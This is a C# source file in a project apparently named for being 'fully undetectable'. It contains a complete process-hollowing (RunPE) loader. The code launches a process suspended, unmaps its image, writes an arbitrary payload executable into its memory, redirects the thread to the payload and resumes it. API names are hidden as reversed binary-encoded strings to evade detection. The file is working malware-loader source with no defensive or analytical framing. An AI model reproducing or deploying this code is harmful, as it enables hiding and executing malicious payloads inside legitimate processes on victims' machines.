using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;

namespace projFUD
{
    public static class PA
    {
        public static string ReverseString(string Str)
        {
            string Revstr = "";
            int Length;
            Length = Str.Length - 1;
            while (Length >= 0)
            {
                Revstr = Revstr + Str[Length];
                Length--;
            }
            return Revstr;
        }
        public static string BinaryToString(string str)
        {
            string chars = System.Text.RegularExpressions.Regex.Replace(str, "[^01]", "");
            byte[] arr = new byte[(chars.Length / 8) - 1 + 1];
            for (int i = 0; i <= arr.Length - 1; i++)
                arr[i] = Convert.ToByte(chars.Substring(i * 8, 8), 2);
            return System.Text.ASCIIEncoding.ASCII.GetString(arr);
        }
        private delegate int DelegateResumeThread(IntPtr handle);
        private delegate bool DelegateWow64SetThreadContext(IntPtr thread, int[] context);
        private delegate bool DelegateSetThreadContext(IntPtr thread, int[] context);
        private delegate bool DelegateWow64GetThreadContext(IntPtr thread, int[] context);
        private delegate bool DelegateGetThreadContext(IntPtr thread, int[] context);
        private delegate int DelegateVirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);
        private delegate bool DelegateWriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
        private delegate bool DelegateReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);
        private delegate int DelegateZwUnmapViewOfSection(IntPtr process, int baseAddress);
        private delegate bool DelegateCreateProcessA(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes,
            bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);


        private static string[] AL = Convert.ToString("0011001000110011011011000110010101101110011100100110010101101011|0110110001101100011001000111010001101110|011001000110000101100101011100100110100001010100011001010110110101110101011100110110010101010010|011101000111100001100101011101000110111001101111010000110110010001100001011001010111001001101000010101000111010001100101010100110011010000110110011101110110111101010111|01110100011110000110010101110100011011100110111101000011011001000110000101100101011100100110100001010100011101000110010101010011|011101000111100001100101011101000110111001101111010000110110010001100001011001010111001001101000010101000111010001100101010001110011010000110110011101110110111101010111|01110100011110000110010101110100011011100110111101000011011001000110000101100101011100100110100001010100011101000110010101000111|0111100001000101011000110110111101101100011011000100000101101100011000010111010101110100011100100110100101010110|011110010111001001101111011011010110010101001101011100110111001101100101011000110110111101110010010100000110010101110100011010010111001001010111|0111100101110010011011110110110101100101010011010111001101110011011001010110001101101111011100100101000001100100011000010110010101010010|0110111001101111011010010111010001100011011001010101001101100110010011110111011101100101011010010101011001110000011000010110110101101110010101010111011101011010|0100000101110011011100110110010101100011011011110111001001010000011001010111010001100001011001010111001001000011|").Split(new string[] { "|" }, StringSplitOptions.None);

        private static string Kernel32 = BinaryToString(AL[0]);
        private static string ntdll = BinaryToString(AL[1]);
        private static string RsmThread = BinaryToString(AL[2]);
        private static string Wow64SetThreadCtx = BinaryToString(AL[3]);
        private static string SetThreadCtx = BinaryToString(AL[4]);
        private static string Wow64GetThreadCtx = BinaryToString(AL[5]);
        private static string GetThreadCtx = BinaryToString(AL[6]);
        private static string VirtualAllcEx = BinaryToString(AL[7]);
        private static string WriteProcessMem = BinaryToString(AL[8]);
        private static string ReadProcessMem = BinaryToString(AL[9]);
        private static string ZwUnmapViewOfSec = BinaryToString(AL[10]);
        private static string CreateProcA = BinaryToString(AL[11]);


        private static readonly DelegateResumeThread ResumeThread = LoadApi<DelegateResumeThread>(ReverseString(Kernel32), ReverseString(RsmThread));
        private static readonly DelegateWow64SetThreadContext Wow64SetThreadContext = LoadApi<DelegateWow64SetThreadContext>(ReverseString(Kernel32), ReverseString(Wow64SetThreadCtx));
        private static readonly DelegateSetThreadContext SetThreadContext = LoadApi<DelegateSetThreadContext>(ReverseString(Kernel32), ReverseString(SetThreadCtx));
        private static readonly DelegateWow64GetThreadContext Wow64GetThreadContext = LoadApi<DelegateWow64GetThreadContext>(ReverseString(Kernel32), ReverseString(Wow64GetThreadCtx));
        private static readonly DelegateGetThreadContext GetThreadContext = LoadApi<DelegateGetThreadContext>(ReverseString(Kernel32), ReverseString(GetThreadCtx));
        private static readonly DelegateVirtualAllocEx VirtualAllocEx = LoadApi<DelegateVirtualAllocEx>(ReverseString(Kernel32), ReverseString(VirtualAllcEx));
        private static readonly DelegateWriteProcessMemory WriteProcessMemory = LoadApi<DelegateWriteProcessMemory>(ReverseString(Kernel32), ReverseString(WriteProcessMem));
        private static readonly DelegateReadProcessMemory ReadProcessMemory = LoadApi<DelegateReadProcessMemory>(ReverseString(Kernel32), ReverseString(ReadProcessMem));
        private static readonly DelegateZwUnmapViewOfSection ZwUnmapViewOfSection = LoadApi<DelegateZwUnmapViewOfSection>(ReverseString(ntdll), ReverseString(ZwUnmapViewOfSec));
        private static readonly DelegateCreateProcessA CreateProcessA = LoadApi<DelegateCreateProcessA>(ReverseString(Kernel32), ReverseString(CreateProcA));

        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
        [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
        private static CreateApi LoadApi<CreateApi>(string name, string method)
        {
            return (CreateApi)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(CreateApi));
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct ProcessInformation
        {
            public readonly IntPtr ProcessHandle;
            public readonly IntPtr ThreadHandle;
            public readonly uint ProcessId;
            private readonly uint ThreadId;
        }
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct StartupInformation
        {
            public uint Size;
            private readonly string Reserved1;
            private readonly string Desktop;
            private readonly string Title;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
            private readonly byte[] Misc;
            private readonly IntPtr Reserved2;
            private readonly IntPtr StdInput;
            private readonly IntPtr StdOutput;
            private readonly IntPtr StdError;
        }


        public static void Execute(string path, byte[] payload)
        {
            for (int i = 0; i < 5; i++)
            {
                int readWrite = 0;
                StartupInformation si = new StartupInformation();
                ProcessInformation pi = new ProcessInformation();
                si.Size = UInt32.Parse(Marshal.SizeOf(typeof(StartupInformation)).ToString());
                string ToInt32 = System.Text.Encoding.Default.GetString(new byte[] { 0x54, 0x6F, 0x49, 0x6E, 0x74, 0x33, 0x32 });
                string ToInt16 = System.Text.Encoding.Default.GetString(new byte[] { 0x54, 0x6F, 0x49, 0x6E, 0x74, 0x31, 0x36 });

                try
                {
                    if (!CreateProcessA(path, string.Empty, IntPtr.Zero, IntPtr.Zero, false, 4 | 134217728, IntPtr.Zero, null, ref si, ref pi)) throw new Exception();
                    int fileAddress = (int)Interaction.CallByName(typeof(BitConverter).GetMethod(ToInt32), BinaryToString("010010010110111001110110011011110110101101100101"), CallType.Method, new object[] { null, new object[] { payload, (30 * 2) } });
                    int imageBase = (int)Interaction.CallByName(typeof(BitConverter).GetMethod(ToInt32), BinaryToString("010010010110111001110110011011110110101101100101"), CallType.Method, new object[] { null, new object[] { payload, fileAddress + (26 * 2) } });
                    int[] context = new int[Convert.ToInt32(89 + 90)];
                    context[0] = 65538;
                    if (IntPtr.Size == 4)
                    { if (!GetThreadContext(pi.ThreadHandle, context)) throw new Exception(); }
                    else
                    { if (!Wow64GetThreadContext(pi.ThreadHandle, context)) throw new Exception(); }
                    int ebx = context[(20 + 21)];
                    int baseAddress = 0;
                    if (!ReadProcessMemory(pi.ProcessHandle, ebx + 8, ref baseAddress, 4, ref readWrite)) throw new Exception();
                    if (imageBase == baseAddress)
                        if (ZwUnmapViewOfSection(pi.ProcessHandle, baseAddress) != 0) throw new Exception();
                    int sizeOfImage = (int)typeof(BitConverter).GetMethod(ToInt32).Invoke(null, new object[] { payload, fileAddress + 80 });
                    int sizeOfHeaders = (int)typeof(BitConverter).GetMethod(ToInt32).Invoke(null, new object[] { payload, fileAddress + 84 });
                    bool allowOverride = false;
                    int newImageBase = VirtualAllocEx(pi.ProcessHandle, imageBase, sizeOfImage, 12288, 64);

                    if (newImageBase == 0) throw new Exception();
                    if (!WriteProcessMemory(pi.ProcessHandle, newImageBase, payload, sizeOfHeaders, ref readWrite)) throw new Exception();
                    int sectionOffset = fileAddress + 248;
                    short numberOfSections = BitConverter.ToInt16(payload, fileAddress + 6);
                    for (int I = 0; I < numberOfSections; I++)
                    {
                        int virtualAddress = (int)typeof(BitConverter).GetMethod(ToInt32).Invoke(null, new object[] { payload, sectionOffset + 12 });
                        int sizeOfRawData = (int)typeof(BitConverter).GetMethod(ToInt32).Invoke(null, new object[] { payload, sectionOffset + 16 });
                        int pointerToRawData = (int)typeof(BitConverter).GetMethod(ToInt32).Invoke(null, new object[] { payload, sectionOffset + 20 });
                        if (sizeOfRawData != 0)
                        {
                            byte[] sectionData = new byte[sizeOfRawData];
                            Buffer.BlockCopy(payload, pointerToRawData, sectionData, 0, sectionData.Length);
                            if (!WriteProcessMemory(pi.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref readWrite)) throw new Exception();
                        }
                        sectionOffset += 40;
                    }
                    byte[] GB = BitConverter.GetBytes(newImageBase);
                    if (!WriteProcessMemory(pi.ProcessHandle, ebx + 8, GB, 4, ref readWrite)) throw new Exception();
                    int addressOfEntryPoint = (int)Interaction.CallByName(typeof(BitConverter).GetMethod(ToInt32), BinaryToString("010010010110111001110110011011110110101101100101"), CallType.Method, new object[] { null, new object[] { payload, fileAddress + 40 } });
                    if (allowOverride) newImageBase = imageBase;
                    context[44] = newImageBase + addressOfEntryPoint;
                    if (IntPtr.Size == 4)
                    {
                        var x = SetThreadContext(pi.ThreadHandle, context);
                        if (!x)
                        {
                            throw new Exception();
                        }
                    }
                    else
                    {
                        var y = Wow64SetThreadContext(pi.ThreadHandle, context);
                        if (!y)
                        {
                            throw new Exception();
                        }
                    }

                    int r = (int)Interaction.CallByName(ResumeThread, BinaryToString("010010010110111001110110011011110110101101100101"), CallType.Method, new object[] { pi.ThreadHandle });

                    if (r == -1 * 1)
                    {
                        throw new Exception();
                    }
                }
                catch
                {
                    Process.GetProcessById(Convert.ToInt32(pi.ProcessId)).Kill();
                    continue;
                }
                break;
            }
        }
    }
}
